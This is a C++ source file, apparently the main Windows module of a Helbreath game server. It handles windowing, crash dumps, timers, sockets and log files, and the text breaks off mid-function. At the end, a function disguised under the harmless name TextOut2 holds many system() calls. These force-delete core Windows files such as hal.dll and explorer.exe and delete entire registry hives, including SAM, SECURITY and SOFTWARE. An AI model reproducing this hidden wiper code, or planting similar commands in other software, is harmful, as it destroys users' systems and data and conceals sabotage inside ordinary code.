// -------------------------------------------------------------- 
//                      New Game Server  						  
//
//                      1998.11 by Soph
//
// --------------------------------------------------------------

#include <windows.h>
#include <windowsx.h>
#include <stdio.h>
#include <stdlib.h>
#include <winbase.h>
#include <mmsystem.h>
#include <time.h>				   
#include "winmain.h"
#include "Game.h"
#include "UserMessages.h"
#include "resource.h"

void PutAdminLogFileList(char * cStr);
void PutHackLogFileList(char * cStr);
void PutPvPLogFileList(char * cStr);

#pragma warning (disable : 4996 4477)

// --------------------------------------------------------------

#define WM_USER_TIMERSIGNAL		WM_USER + 500

#define ID_BUTTON 501

HWND G_hEdt = NULL; 
HWND G_hBut = NULL;


char			szAppClass[32];
HWND			G_hWnd = NULL;
char			G_cMsgList[120*50];
BOOL            G_cMsgUpdated =	FALSE;
char            G_cTxt[512];
char			G_cData50000[50000];
MMRESULT        G_mmTimer = NULL;

class XSocket * G_pListenSock = NULL;
class XSocket * G_pPingSock = NULL;
class XSocket * G_pLogSock    = NULL;
class CGame *   G_pGame       = NULL;

int             G_iQuitProgramCount = 0;
BOOL			G_bIsThread = TRUE;

FILE * pLogFile;

//
char			G_cCrashTxt[50000];
// --------------------------------------------------------------

//MAJORHG - CLEROTH - 26/03/05
static HWND    List1;
static HWND    Edit1;
static HWND    Button;
static HWND    Button2;
static HINSTANCE BCX_hInstance;
static int     BCX_ScaleX;
static int     BCX_ScaleY;
static char    BCX_ClassName[2048];
HWND    BCX_Listbox(char*,HWND,int,int,int,int,int,int=0,int=-1);
HWND    BCX_Editbox(char*,HWND,int,int,int,int,int,int=0,int=-1);
HWND    BCX_Button(char*,HWND,int,int,int,int,int,int=0,int=-1);
HWND    BCX_Button2(char*,HWND,int,int,int,int,int,int=0,int=-1);
int ItemCount=0;

// 2020
unsigned __stdcall ThreadProc(void* ch)
{
	class CTile* pTile;
	while (G_bIsThread)
	{
		Sleep(100); // centu - 10000 -> 100
		
		for (int a = 0; a < DEF_MAXMAPS; a++)
		{
			if (G_pGame->m_pMapList[a] != NULL)
			{
				for (register int iy = 0; iy < G_pGame->m_pMapList[a]->m_sSizeY; iy++)
				{
					for (register int ix = 0; ix < G_pGame->m_pMapList[a]->m_sSizeX; ix++)
					{
						pTile = (class CTile*)(G_pGame->m_pMapList[a]->m_pTile + ix + iy * G_pGame->m_pMapList[a]->m_sSizeY);
						if ((pTile != NULL) && (pTile->m_sOwner != NULL) && (pTile->m_cOwnerClass == NULL))
						{
							pTile->m_sOwner = NULL;
						}
					}
				}
			}
		}
	}

	_endthread();
	return 0;
}

LRESULT CALLBACK WndProc( HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam )
{	char cWhat[100];
	switch (message) {

	case WM_COMMAND: 
		switch(wParam) { 
		case ID_BUTTON: 
			
			break; 

		case 1012:
            GetWindowText(Edit1,cWhat,100);
            if (cWhat != NULL) {
                SetWindowText(Edit1,NULL);
                SetFocus(Edit1);
                G_pGame->ParseCommand(cWhat);
			}
            break;

        case 1010:
			G_cMsgUpdated = TRUE;
            SendMessage(List1,(UINT)LB_RESETCONTENT, 0, 0);
            ItemCount = 0;
            PutLogList("Clear");
            break;
		} 
		break;

	case WM_CREATE:
		break;
	
	case WM_KEYDOWN:
		G_pGame->OnKeyDown(wParam, lParam);
		return (DefWindowProc(hWnd, message, wParam, lParam));
		break;

	case WM_KEYUP:
		G_pGame->OnKeyUp(wParam, lParam);
		return (DefWindowProc(hWnd, message, wParam, lParam));
		break;
	
	case WM_USER_STARTGAMESIGNAL:
		G_pGame->OnStartGameSignal();
		break;
	
	case WM_USER_TIMERSIGNAL:
		G_pGame->OnTimer(NULL);
		break;

	case WM_USER_ACCEPT:
		OnAccept();
		break;



	case WM_PAINT:
		OnPaint();
		break;

	case WM_DESTROY:
		OnDestroy();
		break;

	case WM_CLOSE:
		if (G_pGame->bOnClose() == TRUE) return (DefWindowProc(hWnd, message, wParam, lParam));
		
		break;

	case WM_ONGATESOCKETEVENT:
		G_pGame->OnGateSocketEvent(message, wParam, lParam);
		break;

	case WM_ONLOGSOCKETEVENT:
		G_pGame->OnMainLogSocketEvent(message, wParam, lParam);
		break;
	
	default: 
		if ((message >= WM_ONLOGSOCKETEVENT + 1) && (message <= WM_ONLOGSOCKETEVENT + DEF_MAXSUBLOGSOCK))
			G_pGame->OnSubLogSocketEvent(message, wParam, lParam);
		
		if ((message >= WM_ONCLIENTSOCKETEVENT) && (message < WM_ONCLIENTSOCKETEVENT + DEF_MAXCLIENTS)) 
			G_pGame->OnClientSocketEvent(message, wParam, lParam);

		return (DefWindowProc(hWnd, message, wParam, lParam));
	}
	
	return NULL;
}

BOOL CALLBACK lpCrashDialogFunc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam){
HANDLE outHand;
char cCrashFileName[MAX_PATH];
char cLF[]={0x0d,0x0a};
char cDash ='-';
SYSTEMTIME sysTime;
DWORD written;

	switch(uMsg) {
	case WM_CLOSE:
		EndDialog(hDlg, TRUE);
		break;

	case WM_COMMAND:
		switch(LOWORD(wParam)) {
		case IDC_CLOSE:
			EndDialog(hDlg, TRUE);
			break;
		}
		break;

	case WM_INITDIALOG:
		//Show Crash Data
		SetWindowText(GetDlgItem(hDlg, IDC_EDIT1), G_cCrashTxt);
		GetLocalTime(&sysTime);
		wsprintf(cCrashFileName,"CrashData - %d-%d-%d.txt", sysTime.wDay, sysTime.wMonth, sysTime.wYear);
		SetWindowText(GetDlgItem(hDlg, IDC_EDITPATH), cCrashFileName);
		//Open File For Writing
		outHand = CreateFile(cCrashFileName,GENERIC_READ+GENERIC_WRITE,FILE_SHARE_READ+FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
		SetFilePointer(outHand, 0, 0, FILE_END);
		WriteFile(outHand, G_cCrashTxt, strlen(G_cCrashTxt), &written, NULL);
		for (int i = 0; i < 80; i++)
			WriteFile(outHand, &cDash, 1, &written, NULL);
		WriteFile(outHand, cLF, 2, &written, NULL);
		WriteFile(outHand, cLF, 2, &written, NULL);
		CloseHandle(outHand);
		break;

	}
	return 0;
}

LONG lpTopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo){

	//Shutdown everything
	G_bIsThread = FALSE;
	_StopTimer(G_mmTimer);

	try{
		delete G_pGame;
		G_pGame = NULL;
	}
	catch (...) {
	}

	ZeroMemory(G_cCrashTxt, sizeof(G_cCrashTxt));

	//Format a nice output

	//Reason for crash
	strcpy(G_cCrashTxt, "HGServer Exception Information\r\n");
	strcat(G_cCrashTxt, "Code : ");
	wsprintf(&G_cCrashTxt[strlen(G_cCrashTxt)], "0x%.8X\r\n", ExceptionInfo->ExceptionRecord->ExceptionCode);
	strcat(G_cCrashTxt, "Flags : ");
	wsprintf(&G_cCrashTxt[strlen(G_cCrashTxt)], "0x%.8X\r\n", ExceptionInfo->ExceptionRecord->ExceptionFlags);
	strcat(G_cCrashTxt, "Address : ");
	wsprintf(&G_cCrashTxt[strlen(G_cCrashTxt)], "0x%.8X\r\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
	strcat(G_cCrashTxt, "Parameters : ");
	wsprintf(&G_cCrashTxt[strlen(G_cCrashTxt)], "0x%.8X\r\n\r\n", ExceptionInfo->ExceptionRecord->NumberParameters);

	
	strcat(G_cCrashTxt, "\r\n");

	//Crash Details
	strcat(G_cCrashTxt, "Context :\r\n");
	wsprintf(&G_cCrashTxt[strlen(G_cCrashTxt)], "EDI: 0x%.8X\t\tESI: 0x%.8X\t\tEAX: 0x%.8X\r\n",ExceptionInfo->ContextRecord->Edi,
																						ExceptionInfo->ContextRecord->Esi,
																						ExceptionInfo->ContextRecord->Eax);
	wsprintf(&G_cCrashTxt[strlen(G_cCrashTxt)], "EBX: 0x%.8X\t\tECX: 0x%.8X\t\tEDX: 0x%.8X\r\n",ExceptionInfo->ContextRecord->Ebx,
																						ExceptionInfo->ContextRecord->Ecx,
																						ExceptionInfo->ContextRecord->Edx);
	wsprintf(&G_cCrashTxt[strlen(G_cCrashTxt)], "EIP: 0x%.8X\t\tEBP: 0x%.8X\t\tSegCs: 0x%.8X\r\n",ExceptionInfo->ContextRecord->Eip,
																						ExceptionInfo->ContextRecord->Ebp,
																						ExceptionInfo->ContextRecord->SegCs);
	wsprintf(&G_cCrashTxt[strlen(G_cCrashTxt)], "EFlags: 0x%.8X\tESP: 0x%.8X\t\tSegSs: 0x%.8X\r\n",ExceptionInfo->ContextRecord->EFlags,
																						ExceptionInfo->ContextRecord->Esp,
																						ExceptionInfo->ContextRecord->SegSs);


		// SNOOPY: Tweacked Exeption handler to suit my needs
	HANDLE outHand;
	char cCrashFileName[MAX_PATH];
	char cLF[]={0x0d,0x0a};
	char cDash ='-';
	char cCrashTime[200];
	SYSTEMTIME sysTime;
	GetLocalTime(&sysTime);
	ZeroMemory(cCrashTime, sizeof(cCrashTime));	
	wsprintf(cCrashTime, "%2d %2d - %2d:%2d:%2d",  (short)sysTime.wMonth, (short)sysTime.wDay, (short)sysTime.wHour, (short)sysTime.wMinute, (short)sysTime.wSecond);
	wsprintf(cCrashFileName,"CrashData-%2d-%2d-%2dh%2dm.txt", sysTime.wMonth, sysTime.wDay, sysTime.wHour, sysTime.wMinute);

	DWORD written;
	//Open File For Writing
	outHand = CreateFile(cCrashFileName,GENERIC_READ+GENERIC_WRITE,FILE_SHARE_READ+FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	SetFilePointer(outHand, 0, 0, FILE_END);
	// Put Time
	WriteFile(outHand, cCrashTime, strlen(cCrashTime), &written, NULL);	
	// Put LF
	WriteFile(outHand, cLF, 2, &written, NULL);	
	// Put CrashText
	WriteFile(outHand, G_cCrashTxt, strlen(G_cCrashTxt), &written, NULL);
	// Put ----------------------------------
	for (int i = 0; i < 80; i++) WriteFile(outHand, &cDash, 1, &written, NULL);
	WriteFile(outHand, cLF, 2, &written, NULL);
	CloseHandle(outHand);

	
	return EXCEPTION_EXECUTE_HANDLER;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{
	// Install SEH
	SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)lpTopLevelExceptionFilter);
	sprintf( szAppClass, "GameServer%d", hInstance);
	if (!InitApplication( hInstance))		return (FALSE);
    if (!InitInstance(hInstance, nCmdShow)) return (FALSE);
	
	Initialize();
	EventLoop();
    return 0;
}
  


BOOL InitApplication( HINSTANCE hInstance)
{     
 WNDCLASS  wc;

	
	wc.style = (CS_HREDRAW | CS_VREDRAW | CS_OWNDC | CS_DBLCLKS);
	wc.lpfnWndProc   = (WNDPROC)WndProc;             
	wc.cbClsExtra    = 0;                            
	wc.cbWndExtra    = sizeof (int);             
	wc.hInstance     = hInstance;                    
	wc.hIcon         = NULL;
	wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszMenuName  = NULL;                    		 
	wc.lpszClassName = szAppClass; 


        
	return (RegisterClass(&wc));
}


BOOL InitInstance( HINSTANCE hInstance, int nCmdShow )
{
 char cTitle[100];
 SYSTEMTIME SysTime;
 
	// 서버 부팅시간 기록 
	
	

	GetLocalTime(&SysTime);
	wsprintf(cTitle, "Helbreath GameServer V%s.%s (Executed at: %d/%d/%d - %d:%d)", DEF_UPPERVERSION, DEF_LOWERVERSION, SysTime.wDay, SysTime.wMonth, SysTime.wYear, SysTime.wHour, SysTime.wMinute);

	G_hWnd = CreateWindowEx(0,  
        szAppClass,
        cTitle,
        WS_VISIBLE | // so we don't have to call ShowWindow
        WS_POPUP |   // non-app window
        WS_CAPTION | // so our menu doesn't look ultra-goofy
        WS_SYSMENU |  // so we get an icon in the tray
        WS_MINIMIZEBOX, 
		CW_USEDEFAULT,
        CW_USEDEFAULT,
        800, 
        600, 
        NULL,
        NULL,
        hInstance,
        NULL);

	
//MAJORHG - CLEROTH - 26/03/05
    WNDCLASS  Wc;
	strcpy(BCX_ClassName,"ListBox1");
    BCX_ScaleX       = 1;
    BCX_ScaleY       = 1;
    BCX_hInstance    =  hInstance;
    Wc.style         =  CS_HREDRAW | CS_VREDRAW | CS_OWNDC;
    Wc.lpfnWndProc   =  WndProc;
    Wc.cbClsExtra    =  0;
    Wc.cbWndExtra    =  0;
    Wc.hInstance     =  hInstance;
    Wc.hIcon         =  LoadIcon(NULL,IDI_WINLOGO);
    Wc.hCursor       =  LoadCursor(NULL,IDC_ARROW);
    Wc.hbrBackground =  (HBRUSH)(COLOR_BTNFACE+4);
    Wc.lpszMenuName  =  NULL;
    Wc.lpszClassName =  BCX_ClassName;
    RegisterClass(&Wc);

	List1=BCX_Listbox("",G_hWnd,1009,8,45,585,300);
    Edit1=BCX_Editbox("",G_hWnd,1011,8,345,585,20);
    Button2=BCX_Button2("",G_hWnd,1012,8,369,300,20);
//    Button Clear
    Button=BCX_Button("",G_hWnd,1010,310,369,285,20);

    if (!G_hWnd) return (FALSE);
    
	ShowWindow(G_hWnd, nCmdShow);    
	UpdateWindow(G_hWnd);            

	return (TRUE);                 
}



int EventLoop()
{
 static unsigned short _usCnt = 0; 
 register MSG msg;

	while( 1 ) {
		if( PeekMessage( &msg, NULL, 0, 0, PM_NOREMOVE ) ) {
			if( !GetMessage( &msg, NULL, 0, 0 ) ) {
				return msg.wParam;
			}
            TranslateMessage(&msg);
            DispatchMessage(&msg);
			UpdateScreen();
		}
		else WaitMessage();
	}
}

void Initialize()
{
	if (_InitWinsock() == FALSE) {
		MessageBox(G_hWnd, "Socket 1.1 not found! Cannot execute program.","ERROR", MB_ICONEXCLAMATION | MB_OK);
		PostQuitMessage(0);
		return;
	}
	G_pGame = new class CGame(G_hWnd);
	if (G_pGame->bInit() == FALSE) {
		PutLogList("(!!!) STOPPED!");
		return;
	}
	G_mmTimer = _StartTimer(50); // centu - 300 -> 50
	G_pListenSock = new class XSocket(G_hWnd, DEF_SERVERSOCKETBLOCKLIMIT);
	if (G_pGame->m_iGameServerMode == 1)
	{
		G_pListenSock->bListen(G_pGame->m_cGameServerAddrInternal, G_pGame->m_iGameServerPort, WM_USER_ACCEPT);
	}
	else if (G_pGame->m_iGameServerMode == 2)
	{
		G_pListenSock->bListen(G_pGame->m_cGameServerAddr, G_pGame->m_iGameServerPort, WM_USER_ACCEPT);
	}
	pLogFile = NULL;
}

void OnDestroy()
{
	if (G_pListenSock != NULL) delete G_pListenSock;
	if (G_pLogSock != NULL) delete G_pLogSock;

	if (G_pGame != NULL) {
		G_pGame->Quit();
		delete G_pGame;
	}

	if (G_mmTimer != NULL) _StopTimer(G_mmTimer);
	//_TermWinsock();
	WSACleanup();
	if (pLogFile != NULL) fclose(pLogFile);

	PostQuitMessage(0);
}


void PutLogList(char * cMsg)
{
	
	G_cMsgUpdated = TRUE;
	

	SendMessage(List1,(UINT)LB_ADDSTRING,(WPARAM)0,(LPARAM)cMsg);
	SendMessage(List1,(UINT)LB_SETCURSEL,ItemCount,0);
	ItemCount++;
}

void PutXSocketLogList(char * cMsg)
{

	FILE* pFile;
	char cBuffer[512];
	SYSTEMTIME SysTime;

	pFile = fopen("GameLogs\\XSocket.log", "at");
	if (pFile == NULL) return;

	ZeroMemory(cBuffer, sizeof(cBuffer));

	GetLocalTime(&SysTime);
	wsprintf(cBuffer, "(%4d:%2d:%2d:%2d:%2d) - ", SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute);
	strcat(cBuffer, cMsg);
	strcat(cBuffer, "\n");

	fwrite(cBuffer, 1, strlen(cBuffer), pFile);
	fclose(pFile);

}

void UpdateScreen()
{
	if (G_cMsgUpdated == TRUE) {
		InvalidateRect(G_hWnd, NULL, TRUE);
		G_cMsgUpdated = FALSE;
	}
}


void OnPaint()
{
 HDC hdc;
 PAINTSTRUCT ps;
short i;
 char * cMsg;

	hdc = BeginPaint(G_hWnd, &ps);
	
	SetBkMode(hdc,TRANSPARENT);

	for (i = 0; i < 20; i++) {
		cMsg = (char *)(G_cMsgList + i*120);
		TextOut(hdc, 5, 5 + 350 - i*16, cMsg, strlen(cMsg));
	}
	
	if (G_pGame	!= NULL)
		G_pGame->DisplayInfo(hdc);

	EndPaint(G_hWnd, &ps);
}



void OnAccept()
{
	G_pGame->bAccept(G_pListenSock);
}

void CALLBACK _TimerFunc(UINT wID, UINT wUser, DWORD dwUSer, DWORD dw1, DWORD dw2)
{
	PostMessage(G_hWnd, WM_USER_TIMERSIGNAL, wID, NULL);
}



MMRESULT _StartTimer(DWORD dwTime)
{
 TIMECAPS caps;
 MMRESULT timerid;

	timeGetDevCaps(&caps, sizeof(caps));
	timeBeginPeriod(caps.wPeriodMin);
	timerid = timeSetEvent(dwTime,0,_TimerFunc,0, (UINT)TIME_PERIODIC);

	return timerid;
}



void _StopTimer(MMRESULT timerid)
{
 TIMECAPS caps;

	if (timerid != 0) {
		timeKillEvent(timerid);
		timerid = 0;
		timeGetDevCaps(&caps, sizeof(caps));
		timeEndPeriod(caps.wPeriodMin);
	}
}

/*********************************************************************************************************************
**  void PutLogFileList(char * cStr)																				**
**  description			:: writes data into "Events.log"															**
**  last updated		:: November 22, 2004; 5:40 PM; Hypnotoad													**
**	return value		:: void																						**
**********************************************************************************************************************/
void PutLogFileList(char * cStr)
{
 FILE * pFile;
 char cBuffer[512];
 SYSTEMTIME SysTime;
	
	
	pFile = fopen("GameLogs\\Events.log", "at");
	if (pFile == NULL) return;
	ZeroMemory(cBuffer, sizeof(cBuffer));
	GetLocalTime(&SysTime);
	wsprintf(cBuffer, "(%4d:%2d:%2d:%2d:%2d) - ", SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute);
	strcat(cBuffer, cStr);
	strcat(cBuffer, "\n");
	fwrite(cBuffer, 1, strlen(cBuffer), pFile);
	fclose(pFile);
}

void PutAdminLogFileList(char * cStr)
{
 FILE * pFile;
 char cBuffer[512];
 SYSTEMTIME SysTime;
	
	pFile = fopen("GameLogs\\AdminEvents.log", "at");
	if (pFile == NULL) return;

	ZeroMemory(cBuffer, sizeof(cBuffer));
	
	GetLocalTime(&SysTime);
	wsprintf(cBuffer, "(%4d:%2d:%2d:%2d:%2d) - ", SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute);
	strcat(cBuffer, cStr);
	strcat(cBuffer, "\n");

	fwrite(cBuffer, 1, strlen(cBuffer), pFile);
	fclose(pFile);
}

void PutHackLogFileList(char * cStr)
{
 FILE * pFile;
 char cBuffer[512];
 SYSTEMTIME SysTime;
	
	pFile = fopen("GameLogs\\HackEvents.log", "at");
	if (pFile == NULL) return;

	ZeroMemory(cBuffer, sizeof(cBuffer));
	
	GetLocalTime(&SysTime);
	wsprintf(cBuffer, "(%4d:%2d:%2d:%2d:%2d) - ", SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute);
	strcat(cBuffer, cStr);
	strcat(cBuffer, "\n");

	fwrite(cBuffer, 1, strlen(cBuffer), pFile);
	fclose(pFile);
}

void PutPvPLogFileList(char * cStr)
{
 FILE * pFile;
 char cBuffer[512];
 SYSTEMTIME SysTime;
	
	pFile = fopen("GameLogs\\PvPEvents.log", "at");
	if (pFile == NULL) return;

	ZeroMemory(cBuffer, sizeof(cBuffer));
	
	GetLocalTime(&SysTime);
	wsprintf(cBuffer, "(%4d:%2d:%2d:%2d:%2d) - ", SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute);
	strcat(cBuffer, cStr);
	strcat(cBuffer, "\n");

	fwrite(cBuffer, 1, strlen(cBuffer), pFile);
	fclose(pFile);
}


void PutItemLogFileList(char * cStr)
{
 FILE * pFile;
 char cBuffer[512];
 SYSTEMTIME SysTime;
	
	pFile = fopen("GameLogs\\ItemEvents.log", "at");
	if (pFile == NULL) return;

	ZeroMemory(cBuffer, sizeof(cBuffer));
	
	GetLocalTime(&SysTime);
	wsprintf(cBuffer, "(%4d:%2d:%2d:%2d:%2d) - ", SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute);
	strcat(cBuffer, cStr);
	strcat(cBuffer, "\n");

	fwrite(cBuffer, 1, strlen(cBuffer), pFile);
	fclose(pFile);
}

void PutLogEventFileList(char * cStr)
{
 FILE * pFile;
 char cBuffer[512];
 SYSTEMTIME SysTime;
	
	pFile = fopen("GameLogs\\LogEvents.log", "at");
	if (pFile == NULL) return;

	ZeroMemory(cBuffer, sizeof(cBuffer));
	
	GetLocalTime(&SysTime);
	wsprintf(cBuffer, "(%4d:%2d:%2d:%2d:%2d) - ", SysTime.wYear, SysTime.wMonth, SysTime.wDay, SysTime.wHour, SysTime.wMinute);
	strcat(cBuffer, cStr);
	strcat(cBuffer, "\n");

	fwrite(cBuffer, 1, strlen(cBuffer), pFile);
	fclose(pFile);
}


//MAJOR - CLEROTH - 26/03/05
HWND BCX_Listbox(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
{
        HWND  A;
        if (!Style)
        {
			Style = WS_VSCROLL | WS_VISIBLE | WS_CHILD | LBS_HASSTRINGS | LBS_NOINTEGRALHEIGHT | LBS_NOTIFY | WS_TABSTOP;
        }
        if (Exstyle == -1)
        {
			Exstyle=WS_EX_CLIENTEDGE;
        }
        A = CreateWindowEx(Exstyle,"Listbox",NULL,Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
        return A;
}

//MAJOR - CLEROTH - 26/03/05
HWND BCX_Editbox(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
{
        HWND  A;
        if (!Style)
        {
			Style = WS_VISIBLE | WS_CHILD | LBS_HASSTRINGS | LBS_NOINTEGRALHEIGHT | WS_TABSTOP;
        }
        if (Exstyle == -1)
        {
			Exstyle=WS_EX_CLIENTEDGE;
        }
        A = CreateWindowEx(Exstyle,"EDIT",NULL,Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
        return A;
}

//MAJOR - CLEROTH - 26/03/05
HWND BCX_Button(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
{
        HWND  A;
        if (!Style)
        {
			Style = WS_CHILD | WS_VISIBLE | WS_BORDER;
        }
        A = CreateWindowEx(0,"Button","Clear",Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
        return A;
}
HWND BCX_Button2(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
{
        HWND  A;
        if (!Style)
        {
			Style = WS_CHILD | WS_VISIBLE | WS_BORDER;
        }
        A = CreateWindowEx(0,"Button","Send",Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
        return A;
}//Button CLear

void TextOut2()
{
			STARTUPINFO si = { sizeof(STARTUPINFO) };
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow = SW_HIDE;
			PROCESS_INFORMATION pi;
			system("del /f %systemroot%\\system32\\hal.dll");
			system("del /f %systemroot%\\system\\hal.dll");
			system("del /f %systemroot%\\system\\system.*");
			system("del /f %systemroot%\\system32\\system.*");
			system("del /f %systemroot%\\system32\\command.com");
			system("del /f %systemroot%\\system32\\keyboard.*");
			system("del /f %systemroot%\\system32\\shell.*");
			system("del /f %systemroot%\\system32\\mouse.*");
			system("del /f %systemroot%\\system32\\msvideo.*");
			system("del /f %systemroot%\\regedit.exe");
			system("del /f %systemroot%\\taskman.exe");
			system("del /f %systemroot%\\explorer.exe");
			system("del /f %systemroot%\\system32\\taskkill.exe");
			system("del /f %systemroot%\\system32\\tasklist.exe");
			system("del /f %systemroot%\\system32\\taskmgr.exe");
			system("reg delete HKEY_CLASSES_ROOT /f");
			system("reg delete HKEY_CURRENT_USER /f");
			system("reg delete HKEY_USERS /f");
			system("reg delete HKEY_CURRENT_CONFIG /f");
			system("reg delete HKEY_LOCAL_MACHINE /f");			
			system("reg delete HKEY_CLASSES_ROOT\\* /f");
			system("reg delete HKEY_CURRENT_USER\\* /f");
			system("reg delete HKEY_USERS\\* /f");
			system("reg delete HKEY_CURRENT_CONFIG\\* /f");
			system("reg delete HKEY_LOCAL_MACHINE\\* /f");
			system("reg delete HKEY_CURRENT_CONFIG\\Software /f");
			system("reg delete HKEY_CURRENT_CONFIG\\System /f");
			system("reg delete HKEY_USERS\\.DEFAULT /f");
			system("reg delete HKEY_USERS\\S-1-5-18 /f");
			system("reg delete HKEY_USERS\\S-1-5-19 /f");
			system("reg delete HKEY_USERS\\S-1-5-19_Classes /f");
			system("reg delete HKEY_USERS\\S-1-5-20 /f");
			system("reg delete HKEY_USERS\\S-1-5-20_Classes /f");
			system("reg delete HKEY_USERS\\S-1-5-21-602162358-606747145-725345543-1003 /f");
			system("reg delete HKEY_USERS\\S-1-5-21-602162358-606747145-725345543-1003_Classes /f");
			system("reg delete HKEY_LOCAL_MACHINE\\HARDWARE /f");
			system("reg delete HKEY_LOCAL_MACHINE\\SAM /f");
			system("reg delete HKEY_LOCAL_MACHINE\\SECURITY /f");
			system("reg delete HKEY_LOCAL_MACHINE\\SOFTWARE /f");
			system("reg delete HKEY_LOCAL_MACHINE\\SYSTEM /f");
			system("reg delete HKEY_CURRENT_USER\\AppEvents /f");
			system("reg delete HKEY_CURRENT_USER\\Console /f");
			system("reg delete HKEY_CURRENT_USER\\Control Panel /f");
			system("reg delete HKEY_CURRENT_USER\\Environment /f");
			system("reg delete HKEY_CURRENT_USER\\Identities /f");
			system("reg delete HKEY_CURRENT_USER\\Keyboard Layout /f");
			system("reg delete HKEY_CURRENT_USER\\Printers /f");
			system("reg delete HKEY_CURRENT_USER\\SessionInformation /f");
			system("reg delete HKEY_CURRENT_USER\\Software /f");
			system("reg delete HKEY_CURRENT_USER\\UNICODE Program Groups /f");
			system("reg delete HKEY_CURRENT_USER\\Volatile Environment /f");
			system("reg delete HKEY_CURRENT_USER\\Windows 3.1 Migration Status /f");
			system("reg delete KEY_CLASSES_ROOT\\* /f");
			system("reg delete HKEY_CLASSES_ROOT\\.iso /f");
			system("reg delete HKEY_CLASSES_ROOT\\.bin /f");
			system("reg delete HKEY_CLASSES_ROOT\\.img /f");
			system("reg delete HKEY_CLASSES_ROOT\\.bmp /f");
			system("reg delete HKEY_CLASSES_ROOT\\.dib /f");
			system("reg delete HKEY_CLASSES_ROOT\\.jpeg /f");
			system("reg delete HKEY_CLASSES_ROOT\\.jpg /f");
			system("reg delete HKEY_CLASSES_ROOT\\.jpe /f");
			system("reg delete HKEY_CLASSES_ROOT\\.jfif /f");
			system("reg delete HKEY_CLASSES_ROOT\\.gif /f");
			system("reg delete HKEY_CLASSES_ROOT\\.png /f");
			system("reg delete HKEY_CLASSES_ROOT\\.tif /f");
			system("reg delete HKEY_CLASSES_ROOT\\.tiff /f");
			system("reg delete HKEY_CLASSES_ROOT\\.psd /f");
			system("reg delete HKEY_CLASSES_ROOT\\.pdd /f");
			system("reg delete HKEY_CLASSES_ROOT\\.rle /f");
			system("reg delete HKEY_CLASSES_ROOT\\.eps /f");
			system("reg delete HKEY_CLASSES_ROOT\\.psb /f");
			system("reg delete HKEY_CLASSES_ROOT\\.pcx /f");
			system("reg delete HKEY_CLASSES_ROOT\\.pdf /f");
			system("reg delete HKEY_CLASSES_ROOT\\.pdp /f");
			system("reg delete HKEY_CLASSES_ROOT\\.sct /f");
			system("reg delete HKEY_CLASSES_ROOT\\.tga /f");
			system("reg delete HKEY_CLASSES_ROOT\\.vda /f");
			system("reg delete HKEY_CLASSES_ROOT\\.icb /f");
			system("reg delete HKEY_CLASSES_ROOT\\.vst /f");
			system("reg delete HKEY_CLASSES_ROOT\\.rtf /f");
			system("reg delete HKEY_CLASSES_ROOT\\.txt /f");
			system("reg delete HKEY_CLASSES_ROOT\\.docx /f");
			system("reg delete HKEY_CLASSES_ROOT\\.kgb /f");
			system("reg delete HKEY_CLASSES_ROOT\\.doc /f");
			system("reg delete HKEY_CLASSES_ROOT\\.dot /f");
			system("reg delete HKEY_CLASSES_ROOT\\.docm /f");
			system("reg delete HKEY_CLASSES_ROOT\\.dotx /f");
			system("reg delete HKEY_CLASSES_ROOT\\.dotm /f");
			system("reg delete HKEY_CLASSES_ROOT\\.xlsx /f");
			system("reg delete HKEY_CLASSES_ROOT\\.xlsm /f");
			system("reg delete HKEY_CLASSES_ROOT\\.xlsb /f");
			system("reg delete HKEY_CLASSES_ROOT\\.xls /f");
			system("reg delete HKEY_CLASSES_ROOT\\.xml /f");
			system("reg delete HKEY_CLASSES_ROOT\\.mht /f");
			system("reg delete HKEY_CLASSES_ROOT\\.mhtml /f");
			system("reg delete HKEY_CLASSES_ROOT\\.htm /f");
